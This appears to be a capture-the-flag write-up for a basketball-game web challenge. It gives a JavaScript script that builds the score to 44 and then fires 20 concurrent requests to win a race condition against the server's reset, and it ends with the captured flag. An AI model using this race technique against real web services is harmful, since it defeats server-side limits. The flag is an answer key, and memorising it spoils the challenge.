# My Mayor Muslim...

## Description

My Bagel Jewish...My Christian Dior....

https://ed25472fd89a.boroctf.com/

## Solution Walkthrough

This challenge is a basketball game where each shot scores two points. When the score gets close to 45, the system resets it to zero, and the goal is to exceed 45 points.

Therefore, I created a script to trigger a race condition (though I am not sure if this is the correct solution).

```js
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function shoot() {
  const r = await fetch("/api/shoot", {
    method: "POST",
    credentials: "include"
  });
  return await r.json();
}

async function reset() {
  await fetch("/api/reset", {
    method: "POST",
    credentials: "include"
  });
}

async function state() {
  return await fetch("/api/state", {
    credentials: "include"
  }).then(r => r.json());
}

async function slowTo44(delay = 3000) {
  await reset();

  for (;;) {
    const s = await state();
    console.log("state:", s);

    if ((s.score || 0) >= 44) break;

    const d = await shoot();
    console.log("shot:", d);

    if (d.flag) {
      console.log("FLAG:", d.flag);
      alert(d.flag);
      return true;
    }

    if (d.rigged) {
      console.warn("rigged before 44:", d);
      return false;
    }

    await sleep(delay);
  }

  return true;
}

async function raceAt44(batch=20) {
  await sleep(3200);

  const results = await Promise.allSettled(
    Array.from({ length: batch }, () => shoot())
  );

  const data = results
    .filter(x => x.status === "fulfilled")
    .map(x => x.value);

  console.table(data.map(x => ({
    score: x.score,
    rigged: x.rigged,
    flag: x.flag,
    message: x.message
  })));

  const hit = data.find(x => x.flag);
  if (hit) {
    console.log("FLAG:", hit.flag);
    alert(hit.flag);
    return hit.flag;
  }

  console.warn("no flag, final state:", await state());
  return null;
}

(async () => {
    const ok = await slowTo44(3000);
    if (!ok) return;

    await raceAt44();
})();
```

## Flag

```text
boroCTF{KN!CK5_1N_5555!!!!!}
```
